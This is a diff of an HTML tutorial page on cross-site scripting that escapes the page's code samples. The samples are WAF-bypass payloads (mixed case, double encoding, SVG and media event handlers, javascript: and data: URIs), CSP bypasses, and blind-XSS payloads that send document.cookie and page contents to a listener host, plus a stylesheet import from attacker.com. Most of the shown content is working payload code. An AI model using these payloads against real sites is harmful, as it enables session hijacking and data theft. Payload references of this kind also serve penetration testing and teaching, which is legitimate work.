@@ -322,23 +322,23 @@
                 <p>Many WAFs decode input once. Double encoding bypasses single-pass filtering:</p>
 
                 <pre><code>First Layer Encoding:
-< = &#x3C;
-> = &#x3E;
-" = &#x22;
+&lt; = &amp;#x3C;
+&gt; = &amp;#x3E;
+" = &amp;#x22;
 
 Double Encoded:
-&#x26;#x3C; = &#x26;#x3C;  (&#x3C; is itself encoded)
+&amp;#x26;#x3C; = &amp;#x26;#x3C;  (&amp;#x3C; is itself encoded)
 
-WAF sees: &#x26;#x3C;script&#x26;#x3E; (appears safe)
-Browser decodes once: &#x3C;script&#x3E; (appears safe to WAF)
-Browser decodes again: <script> (EXECUTES!)</code></pre>
+WAF sees: &amp;#x26;#x3C;script&amp;#x26;#x3E; (appears safe)
+Browser decodes once: &amp;#x3C;script&amp;#x3E; (appears safe to WAF)
+Browser decodes again: &lt;script&gt; (EXECUTES!)</code></pre>
 
                 <h3>2. Case Manipulation & Mixed Case</h3>
                 <p>WAF rules often fail on mixed-case payloads:</p>
 
-                <pre><code>Blocked: <script>alert(1)</script>
-Bypasses: <ScRiPt>alert(1)</ScRiPt>
-Bypasses: <sCrIpT>alert(1)</sCrIpT></code></pre>
+                <pre><code>Blocked: &lt;script&gt;alert(1)&lt;/script&gt;
+Bypasses: &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+Bypasses: &lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></pre>
 
                 <h3>3. Encoding Techniques</h3>
 
@@ -362,32 +362,32 @@ Payload: <script>eval(atob('YWxlcnQoMSk='))</script></code></pre>
                 <h3>4. Alternative HTML Tags & Event Handlers</h3>
 
                 <h4>SVG-based XSS:</h4>
-                <pre><code><svg onload=alert(1)>
-<svg><script>alert(1)</script></svg>
-<svg><animate attributeName=x dur=1s values=1 onend=alert(1)>
-<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg></code></pre>
+                <pre><code>&lt;svg onload=alert(1)&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;animate attributeName=x dur=1s values=1 onend=alert(1)&gt;
+&lt;svg&gt;&lt;script xlink:href="data:text/javascript,alert(1)"&gt;&lt;/script&gt;&lt;/svg&gt;</code></pre>
 
                 <h4>HTML5 Media Tags:</h4>
-                <pre><code><audio controls autoplay ontimeupdate=alert(1)>
-<video src=x onerror=alert(1)>
-<source src=x onerror=alert(1)></code></pre>
+                <pre><code>&lt;audio controls autoplay ontimeupdate=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;source src=x onerror=alert(1)&gt;</code></pre>
 
                 <h4>Less Common Tags:</h4>
-                <pre><code><body onload=alert(1)>
-<marquee onstart=alert(1)>
-<details open ontoggle=alert(1)>
-<input onfocus=alert(1) autofocus></code></pre>
+                <pre><code>&lt;body onload=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;</code></pre>
 
                 <h3>5. JavaScript Protocol & Data URIs</h3>
-                <pre><code><a href="javascript:alert(1)">Click</a>
-<a href="javascript:eval(atob('YWxlcnQoMSk='))">Click</a>
-<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
-<embed src="data:text/html,<script>alert(1)</script>"></code></pre>
+                <pre><code>&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
+&lt;a href="javascript:eval(atob('YWxlcnQoMSk='))"&gt;Click&lt;/a&gt;
+&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
+&lt;embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></pre>
 
                 <h3>6. CSS-based XSS (Expression Injection)</h3>
-                <pre><code"><div style="background:url('javascript:alert(1)')">
-<style>@import'http://attacker.com/xss.css'</style>
-<link rel=stylesheet href="javascript:alert(1)"></code></pre>
+                <pre><code>&lt;div style="background:url('javascript:alert(1)')"&gt;
+&lt;style&gt;@import'http://attacker.com/xss.css'&lt;/style&gt;
+&lt;link rel=stylesheet href="javascript:alert(1)"&gt;</code></pre>
 
                 <h3>7. Attribute-based Injection</h3>
                 <pre><code">Injection point: <img src="INJECTION" alt="test">
@@ -407,9 +407,9 @@ $event.view.alert(1)</code></pre>
 
                 <h4>React DOM Vulnerabilities:</h4>
                 <pre><code>// dangerouslySetInnerHTML misuse
-<div dangerouslySetInnerHTML={{__html: userInput}} />
+&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;
 
-// DOM-based if userInput = '<img src=x onerror=alert(1)>'</code></pre>
+// DOM-based if userInput = '&lt;img src=x onerror=alert(1)&gt;'</code></pre>
 
                 <h3>9. Context-Based Payloads</h3>
 
@@ -511,21 +511,21 @@ Deploy to Vercel, get notifications in Slack</code></pre>
 
                 <h4>Step 2: Inject Blind XSS Payloads</h4>
                 <pre><code># Basic payload
-<script src="https://YOUR-LISTENER.burpcollaborator.net"></script>
+&lt;script src="https://YOUR-LISTENER.burpcollaborator.net"&gt;&lt;/script&gt;
 
 # Cookie exfiltration
-<script>fetch('https://YOUR-LISTENER.burpcollaborator.net?c='+document.cookie)</script>
+&lt;script&gt;fetch('https://YOUR-LISTENER.burpcollaborator.net?c='+document.cookie)&lt;/script&gt;
 
 # Refined payload for forms
-<img src=x onerror="fetch('https://YOUR-LISTENER/?steal='+btoa(document.cookie))">
+&lt;img src=x onerror="fetch('https://YOUR-LISTENER/?steal='+btoa(document.cookie))"&gt;
 
 # For admin panels (more guaranteed execution)
-<svg onload="new Image().src='https://YOUR-LISTENER/?admin=true'">
+&lt;svg onload="new Image().src='https://YOUR-LISTENER/?admin=true'"&gt;
 
 # Data extraction from DOM
-<script>
+&lt;script&gt;
 fetch('https://YOUR-LISTENER/?page='+btoa(document.documentElement.innerHTML.substring(0,500)))
-</script></code></pre>
+&lt;/script&gt;</code></pre>
 
                 <h4>Step 3: Monitor for Callbacks</h4>
                 <p>Check your listener for incoming requests. Each request confirms code execution and may contain exfiltrated data.</p>
@@ -572,19 +572,19 @@ fetch('https://YOUR-LISTENER/?page='+btoa(document.documentElement.innerHTML.sub
                 <pre><code>Content-Security-Policy: script-src 'self' 'unsafe-inline'
 
 Bypass:
-<script>alert(1)</script>  // Executes despite CSP</code></pre>
+&lt;script&gt;alert(1)&lt;/script&gt;  // Executes despite CSP</code></pre>
 
                 <h4>CSP allows data: URIs:</h4>
                 <pre><code>Content-Security-Policy: script-src 'self' data:
 
 Bypass:
-<iframe src="data:text/html,<script>alert(1)</script>"></iframe></code></pre>
+&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
 
                 <h4>CSP with wildcard domains:</h4>
                 <pre><code>Content-Security-Policy: script-src *.example.com
 
 If attacker can upload to: cdn.example.com/attacker.js
-<script src="https://cdn.example.com/attacker.js"></script></code></pre>
+&lt;script src="https://cdn.example.com/attacker.js"&gt;&lt;/script&gt;</code></pre>
 
                 <h3>CSP Bypasses via Vulnerabilities in Allowed Domains</h3>
                 <p>If CSP trusts jQuery CDN, exploit jQuery vulnerabilities or use jQuery plugins for XSS.</p>
@@ -592,7 +592,7 @@ If attacker can upload to: cdn.example.com/attacker.js
                 <pre><code>CSP: script-src https://code.jquery.com
 
 Vulnerable jQuery plugin endpoint:
-<script src="https://code.jquery.com/vulnerable-plugin.js?callback=alert(1)"></script></code></pre>
+&lt;script src="https://code.jquery.com/vulnerable-plugin.js?callback=alert(1)"&gt;&lt;/script&gt;</code></pre>
 
                 <div class="warning-box">
                     <h4>⚠️ Real-World 2025 Statistics</h4>
